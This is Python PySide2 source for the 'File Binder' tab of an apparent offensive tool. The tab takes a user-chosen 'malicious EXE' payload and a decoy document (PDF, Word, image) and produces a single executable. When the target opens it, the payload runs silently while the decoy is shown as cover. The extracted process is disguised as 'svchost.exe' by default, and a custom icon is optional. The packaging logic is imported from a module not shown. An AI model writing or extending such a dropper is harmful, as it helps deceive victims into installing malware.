import os
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QGroupBox,
    QFileDialog, QTextEdit, QScrollArea, QFrame,
    QProgressBar
)
from PySide2.QtCore import Qt, QThread, Signal
from generators.binder_generator import generate_binder_exe, generate_stub_only


class BuildThread(QThread):
    """Background build thread to avoid blocking the GUI during PyInstaller compilation"""
    finished = Signal(bool, str)

    def __init__(self, payload_path, decoy_path, output_filename,
                 payload_run_name, icon_path, parent=None):
        super().__init__(parent)
        self.payload_path = payload_path
        self.decoy_path = decoy_path
        self.output_filename = output_filename
        self.payload_run_name = payload_run_name
        self.icon_path = icon_path

    def run(self):
        success, message = generate_binder_exe(
            self.payload_path, self.decoy_path,
            self.output_filename, self.payload_run_name,
            self.icon_path
        )
        self.finished.emit(success, message)


class BinderTab(QWidget):
    def __init__(self):
        super().__init__()
        self.build_thread = None
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(20, 20, 20, 20)
        content_layout.setSpacing(12)

        # Title
        title = QLabel("File Binder")
        title.setObjectName("titleLabel")
        content_layout.addWidget(title)

        subtitle = QLabel(
            "Bundle a payload EXE with a decoy document into a single EXE. "
            "When the target double-clicks, the payload runs silently in the background "
            "while a normal document opens in the foreground as cover. "
            "The final deliverable is a standalone EXE file."
        )
        subtitle.setObjectName("subtitleLabel")
        subtitle.setWordWrap(True)
        content_layout.addWidget(subtitle)

        # --- File Selection ---
        file_group = QGroupBox("File Selection")
        file_layout = QVBoxLayout()

        payload_row = QHBoxLayout()
        payload_row.addWidget(QLabel("Payload EXE:"))
        self.payload_input = QLineEdit()
        self.payload_input.setPlaceholderText("Select the malicious EXE to bundle")
        payload_row.addWidget(self.payload_input, 1)
        self.payload_btn = QPushButton("Browse")
        self.payload_btn.clicked.connect(self.select_payload)
        payload_row.addWidget(self.payload_btn)
        file_layout.addLayout(payload_row)

        decoy_row = QHBoxLayout()
        decoy_row.addWidget(QLabel("Decoy Document:"))
        self.decoy_input = QLineEdit()
        self.decoy_input.setPlaceholderText("Select a legitimate document for cover (PDF/Word/Excel/Image)")
        decoy_row.addWidget(self.decoy_input, 1)
        self.decoy_btn = QPushButton("Browse")
        self.decoy_btn.clicked.connect(self.select_decoy)
        decoy_row.addWidget(self.decoy_btn)
        file_layout.addLayout(decoy_row)

        icon_row = QHBoxLayout()
        icon_row.addWidget(QLabel("EXE Icon:"))
        self.icon_input = QLineEdit()
        self.icon_input.setPlaceholderText("Optional: custom icon file (.ico). Uses default if empty.")
        icon_row.addWidget(self.icon_input, 1)
        self.icon_btn = QPushButton("Browse")
        self.icon_btn.clicked.connect(self.select_icon)
        icon_row.addWidget(self.icon_btn)
        file_layout.addLayout(icon_row)

        file_group.setLayout(file_layout)
        content_layout.addWidget(file_group)

        # --- Output Settings ---
        settings_group = QGroupBox("Output Settings")
        settings_layout = QVBoxLayout()

        mode_row = QHBoxLayout()
        mode_row.addWidget(QLabel("Build Mode:"))
        self.mode_selector = QComboBox()
        self.mode_selector.addItems([
            "Compile to EXE (requires PyInstaller)",
            "Generate Stub Script Only (manual build)"
        ])
        mode_row.addWidget(self.mode_selector, 1)
        settings_layout.addLayout(mode_row)

        name_row = QHBoxLayout()
        name_row.addWidget(QLabel("Process Name:"))
        self.run_name_input = QLineEdit()
        self.run_name_input.setPlaceholderText("Process name after payload extraction (disguised as system process)")
        self.run_name_input.setText("svchost.exe")
        name_row.addWidget(self.run_name_input, 1)
        settings_layout.addLayout(name_row)

        output_row = QHBoxLayout()
        output_row.addWidget(QLabel("Output Filename:"))
        self.output_input = QLineEdit()
        self.output_input.setText("demo.exe")
        output_row.addWidget(self.output_input, 1)
        settings_layout.addLayout(output_row)

        settings_group.setLayout(settings_layout)
        content_layout.addWidget(settings_group)

        # --- Build Progress ---
        progress_group = QGroupBox("Build Status")
        progress_layout = QVBoxLayout()

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)  # Indeterminate progress
        self.progress_bar.setVisible(False)
        progress_layout.addWidget(self.progress_bar)

        self.progress_label = QLabel("")
        self.progress_label.setObjectName("subtitleLabel")
        progress_layout.addWidget(self.progress_label)

        progress_group.setLayout(progress_layout)
        content_layout.addWidget(progress_group)

        # --- Output Info ---
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMaximumHeight(200)
        self.output_text.setStyleSheet(
            "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
        )
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        content_layout.addWidget(output_group)

        content_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        main_layout.addWidget(scroll_area, 1)

        # --- Bottom Bar ---
        bottom_bar = QWidget()
        bottom_bar.setObjectName("bottomBar")
        bottom_layout = QHBoxLayout(bottom_bar)
        bottom_layout.setContentsMargins(20, 12, 20, 12)

        self.generate_btn = QPushButton("🚀 Generate Bundled EXE")
        self.generate_btn.setObjectName("primaryButton")
        self.generate_btn.setMinimumHeight(40)
        self.generate_btn.setMinimumWidth(160)
        self.generate_btn.clicked.connect(self.generate)
        bottom_layout.addWidget(self.generate_btn)

        bottom_layout.addStretch()

        self.status_label = QLabel("")
        bottom_layout.addWidget(self.status_label)

        main_layout.addWidget(bottom_bar)

    def select_payload(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Payload EXE", "",
            "Executables (*.exe);;All Files (*.*)"
        )
        if path:
            self.payload_input.setText(path)

    def select_decoy(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Decoy Document", "",
            "Documents (*.pdf *.docx *.doc *.xlsx *.xls *.pptx *.txt *.jpg *.png);;All Files (*.*)"
        )
        if path:
            self.decoy_input.setText(path)

    def select_icon(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Icon File", "",
            "Icon Files (*.ico);;All Files (*.*)"
        )
        if path:
            self.icon_input.setText(path)

    def generate(self):
        payload = self.payload_input.text().strip()
        decoy = self.decoy_input.text().strip()
        run_name = self.run_name_input.text().strip() or "svchost.exe"
        output_fn = self.output_input.text().strip() or "demo.exe"
        icon = self.icon_input.text().strip() or None
        mode = self.mode_selector.currentIndex()

        if not payload:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ Please select a Payload EXE file")
            return
        if not decoy:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ Please select a decoy document")
            return

        if mode == 1:
            # Generate stub script only
            stub_fn = os.path.splitext(output_fn)[0] + ".py"
            success, message = generate_stub_only(payload, decoy, stub_fn, run_name)
            if success:
                self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
                self.status_label.setText("✅ Stub script generated successfully")
            else:
                self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
                self.status_label.setText(f"❌ {message}")
            self.output_text.setText(message)
            return

        # Compile mode — use background thread
        self.generate_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.progress_label.setText("Building... PyInstaller is packaging, please wait...")
        self.status_label.setText("⏳ Building...")
        self.status_label.setStyleSheet("color: #fdcb6e; font-weight: bold;")

        self.build_thread = BuildThread(payload, decoy, output_fn, run_name, icon)
        self.build_thread.finished.connect(self.on_build_finished)
        self.build_thread.start()

    def on_build_finished(self, success, message):
        self.generate_btn.setEnabled(True)
        self.progress_bar.setVisible(False)
        self.progress_label.setText("")
        self.output_text.setText(message)

        if success:
            self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
            self.status_label.setText("✅ Bundled EXE generated successfully")
        else:
            self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
            self.status_label.setText("❌ Generation failed")
